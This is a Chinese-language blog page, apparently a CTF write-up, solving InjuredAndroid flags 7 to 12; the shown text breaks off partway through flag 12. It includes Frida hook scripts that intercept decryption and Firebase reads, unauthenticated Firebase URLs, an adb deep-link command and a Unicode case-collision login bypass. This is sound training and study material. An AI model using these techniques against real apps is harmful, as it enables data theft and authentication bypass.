@@ -1,0 +1,859 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/url.jpg">
+  <link rel="icon" href="/img/url.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="J_0k3r">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="来活到最后只有你 越想得边个的拥抱 -《人神斗》">
+<meta property="og:type" content="article">
+<meta property="og:title" content="InjuredAndroid - CTF 7-12">
+<meta property="og:url" content="http://example.com/2026/02/27/InjuredAndroid%20-%20CTF%207-12/index.html">
+<meta property="og:site_name" content="J_0k3r">
+<meta property="og:description" content="来活到最后只有你 越想得边个的拥抱 -《人神斗》">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/zmy.jpg">
+<meta property="article:published_time" content="2026-02-27T05:14:52.000Z">
+<meta property="article:modified_time" content="2026-02-27T09:47:45.961Z">
+<meta property="article:author" content="J_0k3r">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/zmy.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>InjuredAndroid - CTF 7-12 - J_0k3r</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":180,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"python"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"41fc030db57d5570dd22f78997dc4a7e","google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?41fc030db57d5570dd22f78997dc4a7e";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>J_0k3r的无人之境</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/playlist/" target="_self">
+                <i class="iconfont icon-music"></i>
+                <span>音乐</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/rsd.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="InjuredAndroid - CTF 7-12"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        J_0k3r
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-02-27 13:14" pubdate>
+          2026年2月27日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">InjuredAndroid - CTF 7-12</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2026年2月27日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="FLAG-SEVEN-SQLITE"><a href="#FLAG-SEVEN-SQLITE" class="headerlink" title="FLAG SEVEN  - SQLITE"></a>FLAG SEVEN  - SQLITE</h3><p><img src="/mdimg/InjuredAndroid-CTF0-6/1772001219517-ba79969d-f6c4-443f-8e41-2cc4f7e5986c.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>b3nac.injuredandroid.FlagSevenSqliteActivity</code></p>
+<p>启动时创建一个数据库<code>Thisisatest.db</code>，关闭后删除这个数据库文件</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772001906796-b8eb5d67-9f8b-4e82-8573-fa56c8955abc.png" srcset="/img/loading.gif" lazyload></p>
+<p>写入的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">contentValues.put(&quot;title&quot;, Base64.decode(&quot;VGhlIGZsYWcgaGFzaCE=&quot;, 0));<br>contentValues.put(&quot;subtitle&quot;, Base64.decode(&quot;MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=&quot;, 0));<br>writableDatabase.insert(&quot;Thisisatest&quot;, null, contentValues);<br>contentValues.put(&quot;title&quot;, Base64.decode(&quot;VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==&quot;, 0));<br>contentValues.put(&quot;subtitle&quot;, h.c());<br><br></code></pre></td></tr></table></figure>
+
+<p>解密如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">The flag hash!<br>2ab96390c7dbe3439de74d0c9b0b1767   //hunter2<br>The flag is also a password!<br></code></pre></td></tr></table></figure>
+
+<p>最后一段是加密数据h.c()</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772002353064-0a49c9bd-a69d-44ba-a37c-956d8bb48e5d.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">private static String f1471c = &quot;9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@&gt;^DB=:E6];D@?&quot;;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772002915824-09185d32-6710-451e-8e81-11d44659c65a.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>[https://injuredandroid.firebaseio.com/sqlite.json](https://injuredandroid.firebaseio.com/sqlite.json)</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772002941532-f0382055-6350-4492-8f61-a74ee2b25247.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>S3V3N_11</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772003018962-d7ae650c-a7ca-4627-a604-d0145989d17c.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>b3nac.injuredandroid.FlagSevenSqliteActivity.submitFlag</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772003179921-1c92e83c-815b-4c94-b7dd-05f12775029d.png" srcset="/img/loading.gif" lazyload></p>
+<p>实现了一个aes加解密</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772003198545-07c14998-7c5e-4b12-8db6-6f5285f4c058.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以直接hook这个方法来解密</p>
+<p>注意这里是j类的c方法自动获取的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plain">Java.perform(function () &#123;<br>    // 1. 获取目标类<br>    var JClass = Java.use(&quot;b3nac.injuredandroid.j&quot;);<br><br>    console.log(&quot;[*] Hooking class: b3nac.injuredandroid.j&quot;);<br><br>    // 2. Hook 实例方法 &#x27;c&#x27;<br>    JClass.c.overload(&#x27;java.lang.String&#x27;, &#x27;java.lang.String&#x27;).implementation = function (key, defaultValue) &#123;<br>        // 先调用原始方法，获取解密后的结果<br>        var result = this.c(key, defaultValue);<br><br>        // 打印日志<br>        console.log(&quot;--------------------------------&quot;);<br>        console.log(&quot;[+] Intercepted Decryption Call&quot;);<br>        console.log(&quot;    Key: &quot; + key);<br>        console.log(&quot;    Default Value: &quot; + defaultValue);<br>        console.log(&quot;    &gt;&gt;&gt; DECRYPTED RESULT: &quot; + result);<br>        console.log(&quot;--------------------------------&quot;);<br><br>        return result; // 必须返回原始结果，否则 App 可能会崩溃或逻辑错误<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>需要输入数据点击submit来触发c方法读取密文，任意输入即可</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772004559418-0db9360d-f390-40c2-b364-db221916bfc7.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772004475540-3e6f3ae0-738b-4fd6-b8e4-eb0059ee5c7d.png" srcset="/img/loading.gif" lazyload></p>
+<p>数据库文件可以在<code>/data/data/b3nac.injuredandroid/databases/</code>找到</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772004852100-a17cc725-bdd0-4558-9328-230cfc48c850.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772005067837-9b5efab1-db8d-402f-90cb-4645f328b5cb.png" srcset="/img/loading.gif" lazyload></p>
+<p>本题类似login，数据存在本地数据库文件且未加密，如果是登录数据库或者业务数据库会造成信息泄露。</p>
+<h3 id="FLAG-EIGHT-AWS"><a href="#FLAG-EIGHT-AWS" class="headerlink" title="FLAG EIGHT - AWS"></a>FLAG EIGHT - AWS</h3><p><code>b3nac.injuredandroid.FlagEightLoginActivity</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772007906369-e0d7cad8-5183-4280-bee9-f44c9438a145.png" srcset="/img/loading.gif" lazyload></p>
+<p>找到字符串比较部分，数据是从<code>Firebase</code>获取的</p>
+<p>在<code>resources.arsc:/res/values/strings.xml</code>找到硬编码的配置</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772007770123-6010df01-4384-4858-bdcf-710fc8aca6cb.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>[https://injuredandroid.firebaseio.com/aws.json](https://injuredandroid.firebaseio.com/aws.json)</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772007841196-9c83d806-62a6-4e37-9535-b8116bf14c78.png" srcset="/img/loading.gif" lazyload></p>
+<p>也可以直接hook <code>com.google.firebase.database.a.c()</code>来获取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">Java.perform(function () &#123;<br>    console.log(&quot;[*] Starting Firebase DataSnapshot Hook...&quot;);<br><br>    var DataSnapshotClass = null;<br><br>    try &#123;<br>        DataSnapshotClass = Java.use(&quot;com.google.firebase.database.a&quot;);<br>        console.log(&quot;[+] Found DataSnapshot class (obfuscated): com.google.firebase.database.a&quot;);<br>    &#125; catch (e) &#123;<br>    &#125;<br><br>    // 2. Hook getValue() 方法<br><br>    var methodName = &quot;c&quot;; // 默认尝试混淆名<br>    console.log(&quot;[*] Hooking method: &quot; + methodName);<br><br>    DataSnapshotClass[methodName].implementation = function () &#123;<br>        // 调用原始方法获取返回值<br>        var result = this[methodName]();<br><br>        // 打印关键信息<br>        console.log(&quot;----------------------------------------&quot;);<br>        console.log(&quot;[Firebase DataSnapshot Intercepted!]&quot;);<br>        console.log(&quot;[*] Method called: &quot; + methodName);<br>        console.log(&quot;[*] Return Value : &quot; + result);<br>        console.log(&quot;[*] Return Type: &quot; + (result ? result.getClass().getName() : &quot;null&quot;));<br>        console.log(&quot;----------------------------------------&quot;);<br><br>        return result;<br>    &#125;;<br><br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772010466148-9e507d9a-8173-4caf-8729-ea21cdffeeb9.png" srcset="/img/loading.gif" lazyload></p>
+<p>提示说跟aws有关</p>
+<p>可以用<code>cloud_enum</code>工具枚举aws地址（<a target="_blank" rel="noopener" href="https://lautarovculic.github.io/writeups/Injured%20Android/#flag-8-aws">https://lautarovculic.github.io/writeups/Injured%20Android/#flag-8-aws</a>）</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772099022242-e79ffd36-794a-47d0-84a8-280cda99dcfd.png" srcset="/img/loading.gif" lazyload></p>
+<p>跑出来结果不一样，应该是aws挂了</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772099128472-e6af7bf4-6838-4d6e-afe7-c20f5958861d.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="FLAG-NINE-FIREBASE"><a href="#FLAG-NINE-FIREBASE" class="headerlink" title="FLAG NINE - FIREBASE"></a>FLAG NINE - FIREBASE</h3><p>同上题</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772085404575-200a562a-5649-418a-82f2-bb519d5541b8.png" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="https://injuredandroid.firebaseio.com/flags.json">https://injuredandroid.firebaseio.com/flags.json</a></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772011752396-40e68d02-c5e8-451a-991c-05a21fe7980f.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="FLAG-TEN-UNICODE"><a href="#FLAG-TEN-UNICODE" class="headerlink" title="FLAG TEN - UNICODE"></a>FLAG TEN - UNICODE</h3><p><code>b3nac.injuredandroid.FlagTenUnicodeActivity</code></p>
+<p>关键逻辑在b方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs plain">public void b(com.google.firebase.database.a aVar) &#123;<br>    FlagTenUnicodeActivity flagTenUnicodeActivity;<br>    String str;<br>    d.s.d.g.e(aVar, &quot;dataSnapshot&quot;);<br>    String str2 = (String) aVar.c();<br>    if (d.s.d.g.a(this.f1462b, str2)) &#123;   //如果输入与firebase获取的相等<br>        flagTenUnicodeActivity = FlagTenUnicodeActivity.this;<br>        str = &quot;No cheating. :]&quot;;<br>    &#125; else &#123;<br>        String str3 = this.f1462b;<br>        Locale locale = Locale.ROOT;<br>        d.s.d.g.d(locale, &quot;Locale.ROOT&quot;);<br>        if (str3 == null) &#123;<br>            throw new NullPointerException(&quot;null cannot be cast to non-null type java.lang.String&quot;);<br>        &#125;<br>        String upperCase = str3.toUpperCase(locale);  //输入转为大写<br>        d.s.d.g.d(upperCase, &quot;(this as java.lang.String).toUpperCase(locale)&quot;);<br>        d.s.d.g.c(str2);<br>        Locale locale2 = Locale.ROOT;<br>        d.s.d.g.d(locale2, &quot;Locale.ROOT&quot;);<br>        if (str2 == null) &#123;<br>            throw new NullPointerException(&quot;null cannot be cast to non-null type java.lang.String&quot;);<br>        &#125;<br>        String upperCase2 = str2.toUpperCase(locale2);  //firebase获取数据转为大写<br>        d.s.d.g.d(upperCase2, &quot;(this as java.lang.String).toUpperCase(locale)&quot;);<br>        if (d.s.d.g.a(upperCase, upperCase2)) &#123;    //转为大写后再比较<br>            FlagTenUnicodeActivity.this.G();       //需要相等<br>            return;<br>        &#125; else &#123;<br>            flagTenUnicodeActivity = FlagTenUnicodeActivity.this;<br>            str = &quot;Try again! :D&quot;;<br>        &#125;<br>    &#125;<br>    Toast.makeText(flagTenUnicodeActivity, str, 0).show();<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>意思就是原字符串不相等，但转大写后要相等</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772092848687-11bac4d1-7137-4561-8eda-56f61e578ae0.png" srcset="/img/loading.gif" lazyload></p>
+<p>firebase无法访问，hook <code>com.google.firebase.database.a</code>来获取firebase值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">Java.perform(function () &#123;<br>    console.log(&quot;[*] Starting Firebase DataSnapshot Hook...&quot;);<br><br>    var DataSnapshotClass = null;<br><br>    try &#123;<br>        DataSnapshotClass = Java.use(&quot;com.google.firebase.database.a&quot;);<br>        console.log(&quot;[+] Found DataSnapshot class (obfuscated): com.google.firebase.database.a&quot;);<br>    &#125; catch (e) &#123;<br>    &#125;<br><br>    // 2. Hook getValue() 方法<br><br>    var methodName = &quot;c&quot;; // 默认尝试混淆名<br>    console.log(&quot;[*] Hooking method: &quot; + methodName);<br><br>    DataSnapshotClass[methodName].implementation = function () &#123;<br>        // 调用原始方法获取返回值<br>        var result = this[methodName]();<br><br>        // 打印关键信息<br>        console.log(&quot;----------------------------------------&quot;);<br>        console.log(&quot;[Firebase DataSnapshot Intercepted!]&quot;);<br>        console.log(&quot;[*] Method called: &quot; + methodName);<br>        console.log(&quot;[*] Return Value : &quot; + result);<br>        console.log(&quot;[*] Return Type: &quot; + (result ? result.getClass().getName() : &quot;null&quot;));<br>        console.log(&quot;----------------------------------------&quot;);<br><br>        return result;<br>    &#125;;<br><br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772101521435-80d8253a-e204-4c68-9352-36c96f897bfe.png" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="https://dev.to/jagracey/hacking-github-s-auth-with-unicode-s-turkish-dotless-i-460n">https://dev.to/jagracey/hacking-github-s-auth-with-unicode-s-turkish-dotless-i-460n</a></p>
+<p><code>John@Github.com</code> –&gt;&gt;&gt; <code>John@Gıthub.com</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772101755988-92051530-1153-42d3-8cb0-f877e95a99c2.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过unicode碰撞，可以绕过认证</p>
+<h3 id="FLAG-ELEVEN-DEEP-LINKS"><a href="#FLAG-ELEVEN-DEEP-LINKS" class="headerlink" title="FLAG ELEVEN - DEEP LINKS"></a>FLAG ELEVEN - DEEP LINKS</h3><p><code>b3nac.injuredandroid.DeepLinkActivity</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772111193207-db8651e4-c3d5-45c0-9b3c-d21f2ee64dc4.png" srcset="/img/loading.gif" lazyload></p>
+<p>没认证的firebase</p>
+<p><code>private final String z = &quot;/binary&quot;;</code></p>
+<p>访问<code>[https://injuredandroid.firebaseio.com/binary.json](https://injuredandroid.firebaseio.com/binary.json)</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772111228646-0df42c1c-93a6-4d79-8116-df19edfc6e93.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然这并不是预期做法</p>
+<p>在AndroidManifest.xml能找到deeplink的配置，通过url scheme方式，访问<code>flag11://</code>能跳转到当前应用的<code>DeepLinkActivity</code>页面</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772111788866-23446912-a93b-4d59-a7a4-c35fcd2b92d6.png" srcset="/img/loading.gif" lazyload></p>
+<p>hook firebase的a方法获取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">Java.perform(function () &#123;<br>    // 锁定 Firebase 的 DataSnapshot 类<br>    var DataSnapshot = Java.use(&quot;com.google.firebase.database.a&quot;); // 根据混淆可能需要调整路径<br><br>    DataSnapshot.c.implementation = function () &#123; // 对应代码中的 aVar.c()<br>        var result = this.c();<br>        console.log(&quot;[*] Firebase Data Retreived: &quot; + result);<br>        return result;<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>先触发DeepLinkActivity</p>
+<p><code> adb shell am start -a android.intent.action.VIEW -d &quot;flag11://&quot;</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772111643133-64dc204c-8f41-4409-9b59-7f85eeba1efa.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后提交数据触发hook</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772111700566-63b150d5-af25-45eb-8f3a-2037dae37ab5.png" srcset="/img/loading.gif" lazyload></p>
+<p>提示还提到了一个<code>Find the compiled treasure.</code></p>
+<p>在assets 目录有一个elf<code>meŉu</code></p>
+<p>ida反编译能看到硬编码的flag</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772113000112-762bd1dd-7bb3-4b8b-aab8-1b902c997f6b.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="FLAG-TWELVE-PROTECTED-COMPONENTS"><a href="#FLAG-TWELVE-PROTECTED-COMPONENTS" class="headerlink" title="FLAG TWELVE - PROTECTED COMPONENTS"></a>FLAG TWELVE - PROTECTED COMPONENTS</h3><p><code>b3nac.injuredandroid.FlagTwelveProtectedActivity</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772173155798-60c78870-f0b5-4824-801e-ad2c77a4d88d.png" srcset="/img/loading.gif" lazyload></p>
+<p>设置允许执行JavaScript，并且接受一个intent <code>totally_secure</code>，值的开头是<code>https://</code>并加载为html</p>
+<p>检查AndroidManifest.xml发现这个类是不可导出的，无法直接调用</p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772173482399-7d4a4f56-a35d-45bb-b572-dca689eb9ecc.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是有另一个可导出的类 <code>b3nac.injuredandroid.ExportedProtectedIntent</code></p>
+<p><img src="/mdimg/InjuredAndroid-CTF0-6/1772173914876-0ffe9bd7-a2f7-4ad7-b43c-8d651c5f1bad.png" srcset="/img/loading.gif" lazyload></p>
